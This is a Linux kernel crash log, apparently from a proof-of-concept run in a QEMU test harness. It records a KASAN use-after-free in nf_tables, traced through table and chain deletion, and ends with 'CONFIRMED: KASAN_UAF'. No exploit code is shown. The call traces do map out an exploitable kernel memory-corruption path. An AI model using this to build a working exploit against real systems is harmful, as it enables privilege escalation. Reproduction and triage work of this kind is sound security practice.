[    2.861116]  ? __pfx_netlink_sendmsg+0x10/0x10
[    2.861674]  __sys_sendto+0x39c/0x410
[    2.862303]  ? __pfx___sys_sendto+0x10/0x10
[    2.862895]  ? vfs_write+0x5bc/0xd70
[    2.863452]  ? do_sock_setsockopt+0xbb/0x160
[    2.864046]  ? ksys_write+0xf9/0x1d0
[    2.864519]  ? __pfx_ksys_write+0x10/0x10
[    2.865120]  __x64_sys_sendto+0xdb/0x1b0
[    2.865758]  ? clear_bhb_loop+0x55/0xb0
[    2.866680]  ? clear_bhb_loop+0x55/0xb0
[    2.867395]  ? clear_bhb_loop+0x55/0xb0
[    2.868142]  do_syscall_64+0xa6/0x1a0
[    2.868665]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    2.869495] RIP: 0033:0x44f5d3
[    2.870122] Code: 48 c7 c3 ff ff ff ff 64 89 02 eb bd 66 2e 0f 1f 84 00 00 00 00 00 90 80 3d 91 39 07 00 00 41 89 ca 74 14 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 75 c3 0f 1f 40 00 55 48 83 ec 30 44 89 4c 24
[    2.872970] RSP: 002b:00007ffff48f11d8 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[    2.874286] RAX: ffffffffffffffda RBX: 0000000031f286f0 RCX: 000000000044f5d3
[    2.875413] RDX: 0000000000000044 RSI: 00000000004c41e0 RDI: 0000000000000003
[    2.876272] RBP: 0000000000000044 R08: 000000000048fca8 R09: 000000000000000c
[    2.877410] R10: 0000000000000000 R11: 0000000000000202 R12: 00000000004a6502
[    2.878339] R13: 000000000000000e R14: 00000000004c4240 R15: 00000000004c41e0
[    2.879365]  </TASK>
[    2.879657] 
[    2.879894] Allocated by task 65:
[    2.880375]  kasan_save_stack+0x33/0x60
[    2.881148]  kasan_save_track+0x14/0x30
[    2.881997]  __kasan_kmalloc+0x8f/0xa0
[    2.882712]  nf_tables_addchain.constprop.0+0x102b/0x22c0
[    2.883438]  nf_tables_newchain+0x1793/0x2800
[    2.884076]  nfnetlink_rcv_batch+0x13e6/0x1e30
[    2.884835]  nfnetlink_rcv+0x2df/0x360
[    2.885423]  netlink_unicast+0x5c2/0x830
[    2.886126]  netlink_sendmsg+0x75c/0xc00
[    2.886915]  __sys_sendto+0x39c/0x410
[    2.887459]  __x64_sys_sendto+0xdb/0x1b0
[    2.888064]  do_syscall_64+0xa6/0x1a0
[    2.888531]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    2.889755] 
[    2.889967] Freed by task 9:
[    2.890897]  kasan_save_stack+0x33/0x60
[    2.891470]  kasan_save_track+0x14/0x30
[    2.891958]  kasan_save_free_info+0x3b/0x60
[    2.892454]  __kasan_slab_free+0x37/0x50
[    2.892948]  kfree+0xcf/0x370
[    2.893309]  nf_tables_trans_destroy_work+0xa1c/0xde0
[    2.894099]  process_one_work+0x5bc/0xfe0
[    2.896749]  worker_thread+0x772/0x1390
[    2.897262]  kthread+0x23e/0x2f0
[    2.897773]  ret_from_fork+0x2c/0x70
[    2.898361]  ret_from_fork_asm+0x1a/0x30
[    2.898972] 
[    2.899217] The buggy address belongs to the object at ffff8880092cfc00
[    2.899217]  which belongs to the cache kmalloc-192 of size 192
[    2.900904] The buggy address is located 80 bytes inside of
[    2.900904]  freed 192-byte region [ffff8880092cfc00, ffff8880092cfcc0)
[    2.902587] 
[    2.902837] The buggy address belongs to the physical page:
[    2.903563] page: refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x92cf
[    2.904884] flags: 0x100000000000000(node=0|zone=1)
[    2.905572] page_type: f5(slab)
[    2.906330] raw: 0100000000000000 ffff888006c413c0 dead000000000122 0000000000000000
[    2.907704] raw: 0000000000000000 0000000000100010 00000001f5000000 0000000000000000
[    2.908774] page dumped because: kasan: bad access detected
[    2.909533] 
[    2.909798] Memory state around the buggy address:
[    2.910481]  ffff8880092cfb00: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    2.911538]  ffff8880092cfb80: fb fb fb fb fb fb fb fb fc fc fc fc fc fc fc fc
[    2.912454] >ffff8880092cfc00: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    2.913396]                                                  ^
[    2.914232]  ffff8880092cfc80: fb fb fb fb fb fb fb fb fc fc fc fc fc fc fc fc
[    2.915387]  ffff8880092cfd00: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    2.916653] ==================================================================
[    2.917827] Disabling lock debugging due to kernel taint
[    2.918886] ------------[ cut here ]------------
[    2.919619] WARNING: CPU: 0 PID: 65 at include/net/netfilter/nf_tables.h:1248 nft_data_release+0xaf/0xd0
[    2.921062] Modules linked in:
[    2.921782] CPU: 0 UID: 0 PID: 65 Comm: poc Tainted: G    B              6.12.0-dirty #1
[    2.923472] Tainted: [B]=BAD_PAGE
[    2.924027] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    2.925323] RIP: 0010:nft_data_release+0xaf/0xd0
[    2.926030] Code: ea 03 0f b6 14 02 48 89 f8 83 e0 07 83 c0 03 38 d0 7c 09 84 d2 74 05 e8 7f 9c 0e fe 8b 43 50 8d 50 ff 89 53 50 85 c0 75 9f 90 <0f> 0b 90 5b c3 cc cc cc cc e8 63 9c 0e fe eb 84 e8 8c 9c 0e fe eb
[    2.929017] RSP: 0018:ffffc90000417440 EFLAGS: 00010246
[    2.930094] RAX: 0000000000000000 RBX: ffff8880092cfc00 RCX: 0000000000000001
[    2.931360] RDX: 00000000ffffffff RSI: 0000000000000008 RDI: ffffffff866bae80
[    2.932434] RBP: ffff88800a024800 R08: 0000000000000001 R09: fffffbfff0cd75d0
[    2.933486] R10: ffffffff866bae87 R11: 6e696c6261736944 R12: 000000000000000c
[    2.934609] R13: ffff888009c68b88 R14: 1ffff92000082e92 R15: 0000000000000001
[    2.935687] FS:  0000000031f27380(0000) GS:ffff88806d000000(0000) knlGS:0000000000000000
[    2.938482] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    2.939342] CR2: 00007ffff48ef0a0 CR3: 0000000007490000 CR4: 0000000000350ef0
[    2.940304] Call Trace:
[    2.940771]  <TASK>
[    2.941136]  ? __warn+0xcc/0x260
[    2.941647]  ? nft_data_release+0xaf/0xd0
[    2.942250]  ? report_bug+0x261/0x2c0
[    2.942754]  ? handle_bug+0x54/0xa0
[    2.943438]  ? exc_invalid_op+0x17/0x50
[    2.944018]  ? asm_exc_invalid_op+0x1a/0x20
[    2.944644]  ? nft_data_release+0xaf/0xd0
[    2.945230]  nft_setelem_data_deactivate+0xe0/0x200
[    2.946024]  nft_map_deactivate+0x2f7/0x440
[    2.946886]  ? __pfx_nft_map_deactivate+0x10/0x10
[    2.947843]  ? __pfx_nft_mapelem_deactivate+0x10/0x10
[    2.948584]  ? __kmalloc_noprof+0x161/0x350
[    2.949227]  ? nft_trans_alloc_gfp+0x1a/0x320
[    2.949904]  nft_delset+0x248/0x320
[    2.950444]  nft_flush_table+0x24c/0x9c0
[    2.951007]  ? nft_table_lookup.part.0+0xf7/0x200
[    2.951700]  nf_tables_deltable+0x660/0xd10
[    2.952335]  ? __pfx_nf_tables_deltable+0x10/0x10
[    2.952994]  ? __pfx___nla_validate_parse+0x10/0x10
[    2.953668]  ? mutex_unlock+0x7e/0xd0
[    2.954227]  ? __pfx_mutex_unlock+0x10/0x10
[    2.954877]  nfnetlink_rcv_batch+0x13e6/0x1e30
[    2.955470]  ? __pfx_nfnetlink_rcv_batch+0x10/0x10
[    2.956220]  ? stack_depot_save_flags+0x28/0x6c0
[    2.956841]  ? __x64_sys_sendto+0xdb/0x1b0
[    2.957447]  ? do_syscall_64+0xa6/0x1a0
[    2.957974]  ? entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    2.958703]  nfnetlink_rcv+0x2df/0x360
[    2.959281]  ? __pfx_nfnetlink_rcv+0x10/0x10
[    2.959936]  ? kmem_cache_alloc_node_noprof+0xe2/0x280
[    2.960800]  ? _copy_from_iter+0x214/0x1130
[    2.961501]  netlink_unicast+0x5c2/0x830
[    2.962036]  ? __pfx_netlink_unicast+0x10/0x10
[    2.962731]  netlink_sendmsg+0x75c/0xc00
[    2.963319]  ? __pfx_netlink_sendmsg+0x10/0x10
[    2.963892]  __sys_sendto+0x39c/0x410
[    2.964414]  ? __pfx___sys_sendto+0x10/0x10
[    2.965081]  ? vfs_write+0x5bc/0xd70
[    2.965553]  ? do_sock_setsockopt+0xbb/0x160
[    2.966105]  ? ksys_write+0xf9/0x1d0
[    2.966655]  ? __pfx_ksys_write+0x10/0x10
[    2.967288]  __x64_sys_sendto+0xdb/0x1b0
[    2.967861]  ? clear_bhb_loop+0x55/0xb0
[    2.968393]  ? clear_bhb_loop+0x55/0xb0
[    2.968882]  ? clear_bhb_loop+0x55/0xb0
[    2.969454]  do_syscall_64+0xa6/0x1a0
[    2.969984]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    2.970651] RIP: 0033:0x44f5d3
[    2.971187] Code: 48 c7 c3 ff ff ff ff 64 89 02 eb bd 66 2e 0f 1f 84 00 00 00 00 00 90 80 3d 91 39 07 00 00 41 89 ca 74 14 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 75 c3 0f 1f 40 00 55 48 83 ec 30 44 89 4c 24
[    2.974019] RSP: 002b:00007ffff48f11d8 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[    2.975077] RAX: ffffffffffffffda RBX: 0000000031f286f0 RCX: 000000000044f5d3
[    2.976809] RDX: 0000000000000044 RSI: 00000000004c41e0 RDI: 0000000000000003
[    2.978254] RBP: 0000000000000044 R08: 000000000048fca8 R09: 000000000000000c
[    2.979302] R10: 0000000000000000 R11: 0000000000000202 R12: 00000000004a6502
[    2.980358] R13: 000000000000000e R14: 00000000004c4240 R15: 00000000004c41e0
[    2.981415]  </TASK>
[    2.981771] ---[ end trace 0000000000000000 ]---
    [drain phase4-deltable] acks=1 last_err=0
[*] PoC completed without KASAN -- if running on the vuln image this means the trigger did not land.  On the fixed image this is the expected outcome.
[    3.098992] poc (65) used greatest stack depth: 25912 bytes left
---- poc end rc=0 ----
secb: poc exited without crashing the kernel
[    4.485734] ACPI: PM: Preparing to enter system sleep state S5
[    4.487862] reboot: Power down
CONFIRMED: KASAN_UAF
